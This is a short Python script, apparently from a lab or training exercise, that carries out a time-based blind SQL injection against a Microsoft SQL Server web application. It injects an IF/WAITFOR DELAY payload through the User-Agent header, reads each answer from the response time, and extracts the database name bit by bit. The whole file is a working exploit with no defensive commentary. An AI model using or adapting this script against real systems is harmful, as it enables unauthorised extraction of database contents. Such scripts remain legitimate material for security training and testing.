#!/usr/bin/python3

import requests
import time

# Define the length of time (in seconds) the server should
# wait if `q` is `true`
DELAY = 1
ip = "10.129.204.197"
# Evalutes `q` on the server side and returns `true` or `false`
def oracle(q):
    start = time.time()
    r = requests.get(
        f"http://{ip}:8080/",
        headers={"User-Agent": f"';IF({q}) WAITFOR DELAY '0:0:{DELAY}'--"}
    )
    return time.time() - start > DELAY

def dumpString(q, length):
    val = ""
    for i in range(1, length + 1):
        c = 0
        for p in range(7):
            if oracle(f"ASCII(SUBSTRING(({q}),{i},1))&{2**p}>0"):
                c |= 2**p
        val += chr(c)
    return val

def dumpNumber(q):
    length = 0
    for p in range(7):
        if oracle(f"({q})&{2**p}>0"):
            length |= 2**p
    return length

# Get DB Name Length
query = "LEN(DB_NAME())"
db_name_length = dumpNumber(query)
print(db_name_length)
# Get DB Name
query = "DB_NAME()"
db_name = dumpString(query, db_name_length)
print(db_name)